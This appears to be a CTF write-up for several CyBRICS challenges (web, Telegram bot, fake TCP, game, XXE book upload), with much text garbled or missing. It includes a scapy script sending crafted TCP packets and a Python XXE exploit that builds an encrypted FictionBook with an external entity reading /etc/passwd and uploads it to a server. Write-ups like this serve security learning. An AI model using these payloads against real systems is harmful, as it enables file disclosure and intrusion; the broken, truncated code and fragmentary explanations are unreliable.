Status: Completed Tag: WEB
Description
Author: Alexander Menshchikov (n0str)
Caesaref recently suﬀered from a massive data breach. It was so critical that they decided to just
start over. Here it goes — Fixaref: “Reliability is Our Game”™®.
This web resource is even more highly optimized:
http://95.179.190.31/
Solution
http://95.179.190.31/index.php/qwer.jsshow ﬂagtoken
tokenﬂag
version: "3"
services:
  test:
    - port: 
      - "port:12345"
3333:12345
    volumes:
        - "/home/flag:/test" #
tokentoken
qwer.jstokenjssmi1eqwer.jstokengetﬂag
Telegram
Status: Completed Tag: MISC
Description
Author: Alexander Menshchikov (n0str)
This Telegram bot really loves live face-to-face communication! And it also seems to have some
covert channel!
@cybrics_facetoface_bot
Solution
Aegisub
ﬀmpeg@Telescopy botvideovideonotefacetoface botﬂag
According to the instruction, I downloaded the video note and found that there are some hints in
the corner which asked us to add green dots to the corner. So I just use Aegisub to make a
subtitle then use ﬀmpeg to generate a video and use @Telescopy to convert the video to video
note. Send the video note to facetoface bot to get ﬂag.
Fake TCP
Status: Completed Tag: Network
Description
Author: George Zaytsev (groke)
Seems like this server doesn't respect network byte order.
It swaps byte order in some tcp header ﬁelds (sport, dport, ack, seq). Could you get the ﬂag from
it?
209.250.241.50:51966
Solution
dport
dport
seq
seq
ack
ack
sport
sport
Game
Status: Completed Tag: Reverse
ip = IP(dst='209.250.241.50')
tcpport = 62240
tcpport += 1
send(IP(dst='209.250.241.50')/TCP(dport=[65226], sport=tcpport, 
seq=0xff00ff00, ack=0x0))
time.sleep(0.9)
send(ip/TCP(dport=[65226], sport=tcpport, flags='A', seq=0x0001ff00, 
ack=0x01000000))
time.sleep(0.5)
send(ip/TCP(dport=[65226], sport=tcpport, flags='A', seq=0x0001ff00, 
ack=0x01000000))
time.sleep(0.5)
send(ip/TCP(dport=[65226], sport=tcpport, flags='A', seq=0x0001ff00, 
ack=0x01000000))
time.sleep(0.5)
send(ip/TCP(dport=[65226], sport=tcpport, flags='A', seq=0x0001ff00, 
ack=0x01000000))
time.sleep(0.5)
send(ip/TCP(dport=[65226], sport=tcpport, flags='PA', seq=0x0001ff00, 
ack=0x28000000) / 'GET_FLAG')
time.sleep(0.5)
send(ip/TCP(dport=[65226], sport=tcpport, flags='PA', seq=0x0001ff00, 
ack=0x28000000) / 'GET_FLAG')
time.sleep(0.5)
send(ip/TCP(dport=[65226], sport=tcpport, flags='PA', seq=0x0001ff00, 
ack=0x28000000) / 'GET_FLAG')
time.sleep(0.5)
send(ip/TCP(dport=[65226], sport=tcpport, flags='FA', seq=0x0801ff00, 
ack=0x29000000))
time.sleep(0.5)
send(ip/TCP(dport=[65226], sport=tcpport, flags='FA', seq=0x0801ff00, 
ack=0x29000000))
Description
Author: George Zaytsev (groke)
Can you pass more than 5 levels?
game_client.elf
run as ./game_client.elf host port
Controls: WASD — moving, F — ﬁreball, C — punch
Game ports (all equal, for load balancing):
95.179.148.72:10001
95.179.148.72:10002
95.179.148.72:10003
Solution
6
Samizdat
Status: Completed Tag: Cyber
Description
Author: Alexander Menshchikov (n0str)
Books are knowledge! Knowledge is power! Power is money! Money is the book with ﬂag!
http://45.77.219.97/
Solution
http://45.77.219.97/authorszone/index.php
, XXE.
We can upload books via this API. It seems to have a XXE vulnerability.
# coding: utf-8
import zlib
import requests
import re
Mminus = [0x87, 0x19, 0x4D, 0x80, 0xFB, 0x09, 0xA8, 0xA9, 0x9E, 0x52, 0x07, 
0xD5, 0xE5, 0xB4, 0x32, 0x35, 0xAC, 0xD7, 0x20, 0xF3, 0x71, 0x2C, 0x86, 0x05, 
0x16, 0x29, 0x59, 0x82, 0xAB, 0x2A, 0x51, 0x7A, 0x26, 0x24, 0x7D, 0x19, 0x7F, 
0x26, 0xF6, 0xF1, 0x22, 0x21, 0x99, 0xEE, 0x69, 0xE4, 0x52, 0x56, 0x2B, 0x51, 
0xA1, 0x68, 0x1A, 0x66, 0xEE, 0x8F, 0x86, 0x8E, 0xDD, 0x87, 0x8D, 0xF1, 0x47, 
0xED, 0x99, 0x9F, 0x41, 0x00, 0xE7, 0x85, 0x8B, 0xC8, 0x4E, 0x35, 0xC5, 0x3E, 
0xA7, 0x4F, 0xDD, 0x5C, 0xA4, 0x78, 0x0F, 0x30, 0x79, 0x5A, 0x3E, 0xA3, 0xE7, 
0x76, 0xAD, 0x24, 0x7D, 0x5C, 0x7B, 0xA5, 0x05, 0x6A, 0x81, 0x9C, 0x91, 0xE4, 
0x32, 0x63, 0xD1, 0xA4, 0x32, 0x73, 0xE6, 0x7D, 0x11, 0x4C, 0xD0, 0x43, 0x26, 
0x00, 0xF6, 0x5A, 0x36, 0x6B, 0x73, 0xAC, 0x5C, 0x99, 0x66, 0x20, 0x01,
          0x15, 0x50, 0x91, 0xD1, 0xB0, 0x1F, 0xFA, 0x44, 0x5A, 0xF3, 0x5E, 
0x70, 0xA1, 0xEA, 0xDF, 0xCC, 0x4F, 0xD1, 0xDE, 0x10, 0x4D, 0xBC, 0xDD, 0x7D, 
0x5A, 0x70, 0x0A, 0x50, 0x67, 0x4D, 0x63, 0x8B, 0xB2, 0x89, 0x80, 0xC0, 0x39, 
0x18, 0xF3, 0x7D, 0xFC, 0x8C, 0x5A, 0xFA, 0x84, 0xDC, 0xC2, 0x9A, 0x79, 0x72, 
0x37, 0x1B, 0x81, 0x3D, 0xC4, 0xF4, 0x2A, 0xBF, 0xF2, 0xBC, 0xFE, 0xA6, 0x3B, 
0xE8, 0x5E, 0xED, 0xD1, 0xC0, 0x3A, 0x2F, 0xEE, 0x93, 0x06, 0xF4, 0xE6, 0x86, 
0xB8, 0xEB, 0x10, 0x35, 0x51, 0x79, 0xF8, 0x75, 0x9E, 0x11, 0x57, 0xF7, 0xCD, 
0x10, 0x81, 0x7B, 0xFF, 0x03, 0x59, 0x0B, 0x62, 0x3A, 0x7D, 0xB5, 0xEC, 0x28, 
0x63, 0x8D, 0xE8, 0x73, 0x55, 0x64, 0xCD, 0xBE, 0x54, 0xE2, 0xD9, 0xD6, 0x73, 
0x3E, 0xD8, 0xEF, 0x2C, 0x6F, 0x45, 0x87, 0x8E, 0xF8, 0xF0, 0xB4, 0x9D, 0x29, 
0x69]
Pminus = [0x0C, 0x0F, 0x0E, 0x08, 0x03, 0x0B, 0x0D,
          0x00, 0x07, 0x09, 0x0A, 0x06, 0x02, 0x01, 0x05, 0x04]
M = [0x95, 0x8F, 0x34, 0x69, 0x15, 0xF1, 0x65, 0x5F, 0xBA, 0x2A, 0x30, 0x27, 
0xA2, 0x1F, 0x3B, 0xE5, 0x81, 0xF7, 0x1A, 0x45, 0xCD, 0xFF, 0x79, 0xB6, 0xC0, 
0x79, 0xE9, 0x83, 0x47, 0x3F, 0xC9, 0xE4, 0xD7, 0x71, 0x11, 0x89, 0x8E, 0x44, 
0x1C, 0x7C, 0xF5, 0x4D, 0xAE, 0x07, 0x87, 0x34, 0x6C, 0xA0, 0xFD, 0x14, 0x5C, 
0x17, 0xD3, 0x96, 0x91, 0xA7, 0x93, 0x3E, 0x79, 0x74, 0xD8, 0xEF, 0x28, 0x2B, 
0x6C, 0xCE, 0xAB, 0x5F, 0x91, 0xCD, 0x6E, 0x1E, 0xC0, 0xC9, 0x9A, 0x1A, 0xC9, 
0x14, 0xB4, 0xD3, 0xAE, 0x68, 0x68, 0x93, 0x06, 0x15, 0x5B, 0xEB, 0x26, 0x9F, 
0xA6, 0xD9, 0xFD, 0x98, 0x64, 0xEA, 0x8A, 0xC3, 0x41, 0xD2, 0xCF, 0x2C, 0x7C, 
0x12, 0x89, 0x50, 0xA0, 0x60, 0xEA, 0x5B, 0x2E, 0xE9, 0xD4, 0xB7, 0x27, 0x9F, 
0x34, 0xF5, 0x39, 0xE8, 0x38, 0x5E, 0x32, 0xB8, 0x50, 0x50, 0x3A, 0xBC,
     0x24, 0x1F, 0x71, 0x5B, 0x23, 0x4B, 0x6C, 0x0C, 0x7D, 0xA5, 0x6B, 0x2A, 
0xE3, 0xA5, 0xAA, 0x9F, 0x8D, 0x26, 0x59, 0x2B, 0x76, 0x3B, 0x0B, 0x3E, 0x0D, 
0x9C, 0xF7, 0x2E, 0x9A, 0x6E, 0xEE, 0x0B, 0x93, 0xEC, 0xF6, 0x63, 0x3C, 0xB1, 
0xDF, 0x2F, 0x0F, 0x8D, 0x9C, 0x61, 0xD6, 0xE8, 0xB0, 0x87, 0x3D, 0x20, 0x0B, 
0x8E, 0xF8, 0xF0, 0x58, 0x18, 0xBA, 0x23, 0x3D, 0x13, 0x6D, 0xFC, 0x67, 0x40, 
0xE8, 0x50, 0x0D, 0x9E, 0x78, 0xEA, 0xAE, 0x7C, 0x9A, 0xD7, 0x24, 0xBA, 0x86, 
0xC9, 0xE4, 0xCE, 0xEB, 0xC3, 0x75, 0x61, 0xB2, 0x7F, 0xFE, 0xE7, 0xD7, 0x16, 
0x4D, 0xBD, 0x8C, 0xB5, 0x3B, 0x31, 0xC2, 0x57, 0xA0, 0x5C, 0xCF, 0x21, 0x2D, 
0x12, 0x5F, 0x94, 0x1D, 0x78, 0x2E, 0x91, 0xB3, 0x4C, 0x84, 0xAE, 0x13, 0xFF, 
0x21, 0x76, 0x1F, 0xF3, 0xDC, 0x19, 0x44, 0x66, 0x59, 0xAB, 0xAF, 0xB3]
P = [0x07, 0x0D, 0x0C, 0x04, 0x0F, 0x0E, 0x0B, 0x08,
     0x03, 0x09, 0x0A, 0x05, 0x00, 0x06, 0x02, 0x01]
ef decrypt_block(content):
   content = map(ord, content)
   tmp = [0] * 16
   for i in range(16):
       for j in range(16):
           v1 = 0
           for k in range(16):
               v1 += Mminus[16 * k + j] * content[k]
           tmp[j] = v1 & 0xff
       for l in range(16):
           content[l] = tmp[Pminus[l]]
   return ''.join(map(chr, content))
ef encrypt_block(content):
   content = map(ord, content)
   tmp = content[:]
   for i in range(16):
       for l in range(16):
           content[l] = tmp[P[l]]
       for j in range(16):
           v1 = 0
           for k in range(16):
               v1 += M[16 * k + j] * content[k]
           tmp[j] = v1 & 0xff
   return ''.join(map(chr, tmp))
ef decrypt(content):
   res = ''
   for i in range(0, len(content), 16):
couchdblibraryﬂag bookurlﬂag
After reading the source code, we found that it used couchdb, so we can go through all the record
in library to ﬁnd the url of ﬂag book, then decompress it to get ﬂag.
       res += decrypt_block(content[i:i + 16])
   return zlib.decompress(res)
ef encrypt(content):
   content = zlib.compress(content)
   padlength = 16 - len(content) % 16
   content += chr(padlength) * padlength
   res = ''
   for i in range(0, len(content), 16):
       res += encrypt_block(content[i:i + 16])
   return res
pl = '''
!DOCTYPE foo [
>
FictionBook xmlns:xlink="http://www.w3.org/1999/xlink" 
xmlns="http://www.gribuser.ru/xml/fictionbook/2.0">
&file;1111
11988ruru
À.1
tbma12003-01-312EF7A334-19E2-4A12-9B74-
CADAA5F04A881.01'''
ayload = 'file:///etc/passwd'
ith open('res.book', 'wb') as f:
   f.write(encrypt(tpl.format(payload)))
es = requests.post(
   'http://45.77.219.97/authorszone/index.php', files={'newbook': 
open('res.book', 'rb')}).content
print re.search('(.*?)', res, re.M | re.S).groups()
[0]